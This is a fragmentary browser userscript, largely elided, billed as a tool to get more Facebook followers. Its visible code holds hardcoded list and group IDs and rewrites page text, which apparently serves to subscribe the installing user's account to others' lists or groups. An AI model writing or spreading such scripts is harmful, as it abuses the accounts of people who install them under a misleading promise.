// ==UserScript==
// @name            Auto Followers -Get More Followers For Facebook-a
// @description     Auto Followers by Yuri Grigorian
...
sublist("557936594271926");


var gid = ['523791067697899'];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Ceasar Sanchez';
